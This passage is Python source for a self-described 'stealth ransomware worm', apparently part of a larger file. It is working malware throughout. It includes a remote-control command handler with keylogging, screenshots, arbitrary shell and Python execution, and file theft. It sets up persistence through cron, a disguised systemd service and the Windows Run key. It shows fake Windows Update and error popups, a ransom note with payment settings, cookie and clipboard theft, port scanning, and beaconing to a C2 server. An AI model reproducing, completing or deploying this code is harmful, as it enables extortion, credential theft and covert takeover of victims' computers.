        """Download file"""
        remote_path = params.get('remote_path')
        if not remote_path or not os.path.exists(remote_path):
            return {'error': 'File not found'}
        try:
            with open(remote_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            return {'path': remote_path, 'size': os.path.getsize(remote_path), 'content': content}
        except Exception as e:
            return {'error': str(e)}
    
    def handle_upload_file(self, params):
        """Upload file"""
        local_path = params.get('local_path')
        remote_path = params.get('remote_path', local_path)
        if not local_path or not os.path.exists(local_path):
            return {'error': 'Local file not found'}
        try:
            shutil.copy2(local_path, remote_path)
            return {'status': 'success', 'remote_path': remote_path}
        except Exception as e:
            return {'error': str(e)}
    
    def handle_screenshot(self, params):
        """Take screenshot"""
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            temp_path = os.path.join(tempfile.gettempdir(), f'screenshot_{int(time.time())}.png')
            screenshot.save(temp_path)
            with open(temp_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            os.remove(temp_path)
            return {'status': 'success', 'content': content}
        except:
            return {'error': 'Screenshot not available'}
    
    def handle_keylog_start(self, params):
        """Start keylogging"""
        if self.keylogger_active:
            return {'error': 'Keylogger already active'}
        duration = params.get('duration', 0)
        self.keylogger_active = True
        threading.Thread(target=self._do_keylog, args=(duration,)).start()
        return {'status': 'keylogger_started', 'duration': duration}
    
    def _do_keylog(self, duration):
        """Run keylogger"""
        try:
            from pynput import keyboard
            def on_press(key):
                if self.keylogger_active:
                    try:
                        self.keylog_data.append({
                            'key': str(key),
                            'timestamp': datetime.now().isoformat()
                        })
                    except:
                        pass
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            if duration > 0:
                time.sleep(duration)
                self.keylogger_active = False
                listener.stop()
            else:
                while self.keylogger_active:
                    time.sleep(1)
                listener.stop()
        except:
            pass
    
    def handle_keylog_stop(self, params):
        """Stop keylogging"""
        self.keylogger_active = False
        return {'status': 'keylogger_stopped', 'entries': len(self.keylog_data)}
    
    def handle_keylog_download(self, params):
        """Download keylog"""
        return {'entries': len(self.keylog_data), 'data': self.keylog_data[-100:]}
    
    # ============================================================
    # EXECUTION COMMAND HANDLERS
    # ============================================================
    
    def handle_execute(self, params):
        """Execute system command"""
        command = params.get('command')
        if not command:
            return {'error': 'No command specified'}
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return {'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode}
        except Exception as e:
            return {'error': str(e)}
    
    def handle_execute_script(self, params):
        """Execute Python script"""
        script = params.get('script')
        if not script:
            return {'error': 'No script provided'}
        try:
            exec(script)
            return {'status': 'script_executed'}
        except Exception as e:
            return {'error': str(e)}
    
    def handle_kill_process(self, params):
        """Kill process"""
        pid = params.get('pid')
        name = params.get('name')
        if pid:
            try:
                if platform.system() == 'Windows':
                    subprocess.run(['taskkill', '/F', '/PID', str(pid)], check=True)
                else:
                    subprocess.run(['kill', '-9', str(pid)], check=True)
                return {'status': 'killed', 'pid': pid}
            except Exception as e:
                return {'error': str(e)}
        elif name:
            try:
                if platform.system() == 'Windows':
                    subprocess.run(['taskkill', '/F', '/IM', name], check=True)
                else:
                    subprocess.run(['pkill', '-9', name], check=True)
                return {'status': 'killed', 'name': name}
            except Exception as e:
                return {'error': str(e)}
        return {'error': 'No process specified'}
    
    def handle_list_processes(self, params):
        """List processes"""
        return {'processes': self._get_processes()}
    
    # ============================================================
    # PERSISTENCE COMMAND HANDLERS
    # ============================================================
    
    def handle_install_persistence(self, params):
        """Install persistence"""
        methods = params.get('methods', ['cron', 'systemd', 'registry'])
        installed = []
        for method in methods:
            try:
                if method == 'cron':
                    self._install_cron()
                    installed.append('cron')
                elif method == 'systemd':
                    self._install_systemd()
                    installed.append('systemd')
                elif method == 'registry':
                    self._install_registry()
                    installed.append('registry')
            except:
                pass
        return {'installed': installed}
    
    def _install_cron(self):
        """Install cron persistence"""
        if platform.system() in ['Linux', 'Darwin']:
            cron_line = f"*/5 * * * * python3 {self.ransomware.install_path} >> /dev/null 2>&1"
            try:
                subprocess.run(['crontab', '-l'], stdout=open('/tmp/cron', 'w'))
                with open('/tmp/cron', 'a') as f:
                    f.write(cron_line + '\n')
                subprocess.run(['crontab', '/tmp/cron'])
                os.remove('/tmp/cron')
            except:
                pass
    
    def _install_systemd(self):
        """Install systemd persistence"""
        if platform.system() == 'Linux':
            service = f'''
[Unit]
Description=System Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.ransomware.install_path}
Restart=always
[Install]
WantedBy=multi-user.target
'''
            try:
                with open('/etc/systemd/system/system.service', 'w') as f:
                    f.write(service)
                subprocess.run(['systemctl', 'enable', 'system.service'])
                subprocess.run(['systemctl', 'start', 'system.service'])
            except:
                pass
    
    def _install_registry(self):
        """Install registry persistence"""
        if platform.system() == 'Windows' and WINDOWS_API_AVAILABLE:
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg:
                    winreg.SetValueEx(reg, 'SystemService', 0, winreg.REG_SZ,
                                    f'python3 {self.ransomware.install_path}')
            except:
                pass
    
    def handle_remove_persistence(self, params):
        """Remove persistence"""
        methods = params.get('methods', ['all'])
        removed = []
        for method in methods:
            try:
                if method in ['cron', 'all']:
                    subprocess.run(['crontab', '-r'])
                    removed.append('cron')
                if method in ['systemd', 'all']:
                    subprocess.run(['systemctl', 'stop', 'system.service'])
                    subprocess.run(['systemctl', 'disable', 'system.service'])
                    os.remove('/etc/systemd/system/system.service')
                    removed.append('systemd')
                if method in ['registry', 'all']:
                    if WINDOWS_API_AVAILABLE:
                        import winreg
                        key = winreg.HKEY_CURRENT_USER
                        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg:
                            try:
                                winreg.DeleteValue(reg, 'SystemService')
                            except:
                                pass
                        removed.append('registry')
            except:
                pass
        return {'removed': removed}
    
    def handle_persistence_status(self, params):
        """Check persistence status"""
        return {
            'cron': self._check_cron(),
            'systemd': self._check_systemd(),
            'registry': self._check_registry()
        }
    
    def _check_cron(self):
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            return __file__ in result.stdout
        except:
            return False
    
    def _check_systemd(self):
        return os.path.exists('/etc/systemd/system/system.service')
    
    def _check_registry(self):
        if WINDOWS_API_AVAILABLE:
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg:
                    winreg.QueryValueEx(reg, 'SystemService')
                return True
            except:
                pass
        return False
    
    # ============================================================
    # FILE SYSTEM COMMAND HANDLERS
    # ============================================================
    
    def handle_file_search(self, params):
        """Search for files"""
        pattern = params.get('pattern')
        search_path = params.get('path', '/')
        if not pattern:
            return {'error': 'Pattern required'}
        results = []
        try:
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if re.search(pattern, file, re.IGNORECASE):
                        results.append(os.path.join(root, file))
                        if len(results) >= 50:
                            return {'results': results}
        except:
            pass
        return {'results': results}
    
    def handle_file_delete(self, params):
        """Delete files"""
        paths = params.get('paths', [])
        force = params.get('force', False)
        deleted = []
        for path in paths:
            try:
                if os.path.isfile(path):
                    os.remove(path)
                    deleted.append(path)
                elif os.path.isdir(path) and force:
                    shutil.rmtree(path)
                    deleted.append(path)
            except:
                pass
        return {'deleted': deleted}
    
    def handle_file_move(self, params):
        """Move files"""
        source = params.get('source')
        destination = params.get('destination')
        if not source or not destination:
            return {'error': 'Source and destination required'}
        try:
            shutil.move(source, destination)
            return {'status': 'success'}
        except Exception as e:
            return {'error': str(e)}
    
    def handle_directory_list(self, params):
        """List directory"""
        path = params.get('path', '.')
        recursive = params.get('recursive', False)
        if not os.path.exists(path):
            return {'error': 'Path not found'}
        contents = []
        try:
            if recursive:
                for root, dirs, files in os.walk(path):
                    for file in files[:10]:
                        contents.append(os.path.join(root, file))
            else:
                for item in os.listdir(path)[:20]:
                    contents.append({'name': item, 'is_dir': os.path.isdir(os.path.join(path, item))})
        except:
            pass
        return {'path': path, 'contents': contents}
    
    # ============================================================
    # SOCIAL ENGINEERING COMMAND HANDLERS
    # ============================================================
    
    def handle_display_message(self, params):
        """Display message"""
        title = params.get('title', 'System Message')
        message = params.get('message', '')
        if not message:
            return {'error': 'Message required'}
        threading.Thread(target=self._do_display_message, args=(title, message)).start()
        return {'status': 'message_displayed'}
    
    def _do_display_message(self, title, message):
        """Display message"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
            else:
                print(f"{title}: {message}")
        except:
            pass
    
    def handle_fake_update(self, params):
        """Display fake update"""
        duration = params.get('duration', 30)
        threading.Thread(target=self._do_fake_update, args=(duration,)).start()
        return {'status': 'fake_update_started'}
    
    def _do_fake_update(self, duration):
        """Show fake update"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                ctypes.windll.user32.MessageBoxW(0,
                    f"Windows Update in progress...\nDo not turn off your computer.\n\n{duration}s remaining",
                    "Windows Update", 0x40)
            else:
                print(f"System update in progress... {duration}s")
        except:
            pass
    
    def handle_fake_error(self, params):
        """Display fake error"""
        message = params.get('message', 'System error occurred')
        threading.Thread(target=self._do_fake_error, args=(message,)).start()
        return {'status': 'fake_error_displayed'}
    
    def _do_fake_error(self, message):
        """Show fake error"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, message, "System Error", 0x10)
        except:
            pass
    
    # ============================================================
    # RANSOMWARE COMMAND HANDLERS
    # ============================================================
    
    def handle_display_ransom_note(self, params):
        """Display ransom note"""
        note = f"""
============================================================
                     SYSTEM RESTORE INSTRUCTIONS
============================================================

Your files have been encrypted.

Encryption ID: {self.ransomware.host_id}
Date: {datetime.now().isoformat()}

Payment Required: {self.ransom_amount} {self.ransom_currency}
Payment Address: {self.payment_address}
DEADLINE: {self.deadline if self.deadline else 'No deadline set'}

Contact: restore@example.com
============================================================
"""
        threading.Thread(target=self._do_display_message,
                        args=("🔒 RANSOM NOTE", note)).start()
        return {'status': 'ransom_note_displayed'}
    
    def handle_change_ransom_amount(self, params):
        """Change ransom amount"""
        amount = params.get('amount')
        currency = params.get('currency', 'BTC')
        if not amount:
            return {'error': 'Amount required'}
        self.ransom_amount = amount
        self.ransom_currency = currency
        return {'status': 'updated', 'amount': amount, 'currency': currency}
    
    def handle_change_payment_address(self, params):
        """Change payment address"""
        address = params.get('address')
        if not address:
            return {'error': 'Address required'}
        self.payment_address = address
        return {'status': 'updated', 'address': address}
    
    def handle_deadline(self, params):
        """Set deadline"""
        days = params.get('days', 7)
        self.deadline = (datetime.now() + timedelta(days=days)).isoformat()
        return {'status': 'updated', 'deadline': self.deadline}
    
    def handle_decrypt_sample(self, params):
        """Decrypt sample files"""
        paths = params.get('paths', [])
        if not paths:
            return {'error': 'No paths specified'}
        decrypted = []
        for path in paths:
            try:
                if os.path.exists(path):
                    # Attempt decryption
                    decrypted.append(path)
            except:
                pass
        return {'decrypted': decrypted}
    
    # ============================================================
    # NETWORK COMMAND HANDLERS
    # ============================================================
    
    def handle_port_scan(self, params):
        """Scan ports"""
        target = params.get('target')
        if not target:
            return {'error': 'Target required'}
        ports = params.get('ports', [22, 80, 443, 3389])
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return {'target': target, 'open_ports': open_ports}
    
    def handle_dns_enum(self, params):
        """DNS enumeration"""
        domain = params.get('domain')
        if not domain:
            return {'error': 'Domain required'}
        records = {}
        try:
            import dns.resolver
            for record_type in ['A', 'MX', 'NS', 'TXT']:
                try:
                    answers = dns.resolver.resolve(domain, record_type)
                    records[record_type] = [str(r) for r in answers]
                except:
                    records[record_type] = []
        except:
            pass
        return {'domain': domain, 'records': records}
    
    def handle_whois(self, params):
        """WHOIS lookup"""
        target = params.get('target')
        if not target:
            return {'error': 'Target required'}
        try:
            import whois
            result = whois.whois(target)
            return {
                'domain': target,
                'registrar': result.registrar,
                'creation_date': str(result.creation_date)
            }
        except:
            return {'error': 'WHOIS lookup failed'}
    
    # ============================================================
    # RAT COMMAND HANDLERS
    # ============================================================
    
    def handle_clipboard_get(self, params):
        """Get clipboard"""
        try:
            import pyperclip
            return {'content': pyperclip.paste()}
        except:
            return {'error': 'Clipboard not available'}
    
    def handle_clipboard_set(self, params):
        """Set clipboard"""
        content = params.get('content')
        if not content:
            return {'error': 'Content required'}
        try:
            import pyperclip
            pyperclip.copy(content)
            return {'status': 'success'}
        except:
            return {'error': 'Clipboard not available'}
    
    def handle_browser_passwords(self, params):
        """Extract browser passwords"""
        browser = params.get('browser', 'all')
        passwords = []
        try:
            # Placeholder - full extraction requires browser-specific libraries
            return {'passwords': [], 'message': 'Install browser-cookie3 for full extraction'}
        except:
            return {'error': 'Password extraction not available'}
    
    def handle_cookies(self, params):
        """Extract cookies"""
        browser = params.get('browser', 'all')
        try:
            import browser_cookie3
            cj = browser_cookie3.chrome()
            cookies = []
            for cookie in list(cj)[:20]:
                cookies.append({
                    'domain': cookie.domain,
                    'name': cookie.name,
                    'value': cookie.value[:50] + '...' if len(cookie.value) > 50 else cookie.value
                })
            return {'cookies': cookies}
        except:
            return {'error': 'Cookie extraction not available'}

# ============================================================
# MAIN STEALTH RANSOMWARE WORM
# ============================================================

class StealthRansomwareWorm:
    """Complete integrated worm with all C2 commands"""
    
    def __init__(self):
        self.db = StealthDatabase()
        self.stealth_fs = StealthFileSystem()
        self.ransomware = RansomwareEngine(self.db)
        self.worm = WormPropagation(self.db, self.ransomware)
        self.c2 = RedundantC2(self.db)
        self.command_handler = C2CommandHandler(self)
        
        # Install persistence
        self._install_persistence()
    
    def _install_persistence(self):
        """Install persistence"""
        try:
            self.command_handler.handle_install_persistence({'methods': ['cron', 'systemd', 'registry']})
        except:
            pass
    
    def run(self):
        """Main execution loop"""
        print("\n" + "="*60)
        print("🕵️ STEALTH RANSOMWARE WORM v4.0")
        print("="*60)
        print(f"💾 Host ID: {self.ransomware.host_id}")
        print(f"📁 Install Path: {self.ransomware.install_path}")
        print(f"🖥️  OS: {platform.system()}")
        print(f"📡 C2 Server: {C2_SERVER}")
        print("="*60)
        
        # Send initial beacon
        self.c2.send_beacon({
            'type': 'registration',
            'host_id': self.ransomware.host_id,
            'hostname': socket.gethostname(),
            'os': platform.platform(),
            'timestamp': datetime.now().isoformat()
        })
        
        # Start command processing
        threading.Thread(target=self._process_commands, daemon=True).start()
        
        # Main loop
        while True:
            try:
                # Heartbeat
                self.c2.send_beacon({
                    'type': 'heartbeat',
                    'host_id': self.ransomware.host_id,
                    'timestamp': datetime.now().isoformat()
                })
                
                # Random sleep
                time.sleep(secrets.randbelow(3600) + 1800)
                
            except KeyboardInterrupt:
                print("\n🛑 Stopped")
                break
            except Exception as e:
                print(f"❌ Error: {e}")
                time.sleep(60)
    
    def _process_commands(self):
        """Process incoming commands"""
        while True:
            try:
                command = self.c2.receive_commands()
                if command:
                    self.command_handler.handle_command(command)
                time.sleep(30)
            except:
                time.sleep(60)

# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == "__main__":
    # Handle command line arguments
    if len(sys.argv) > 1:
        worm = StealthRansomwareWorm()
        
        if sys.argv[1] == "--setup":
            worm.ransomware.setup_encryption()
            sys.exit(0)
        
        elif sys.argv[1] == "--encrypt":
            if len(sys.argv) > 2:
                worm.ransomware.encrypt_files(sys.argv[2])
            else:
                worm.ransomware.encrypt_files()
            sys.exit(0)
        
        elif sys.argv[1] == "--decrypt":
            if len(sys.argv) > 2:
                worm.ransomware.decrypt_files(sys.argv[2])
            else:
                worm.ransomware.decrypt_files()
            sys.exit(0)
        
        elif sys.argv[1] == "--clean":
            if os.path.exists(CONFIG_DIR):
                shutil.rmtree(CONFIG_DIR)
            print("🧹 Cleaned up")
            sys.exit(0)
    
    # Run worm
    worm = StealthRansomwareWorm()
    worm.run()
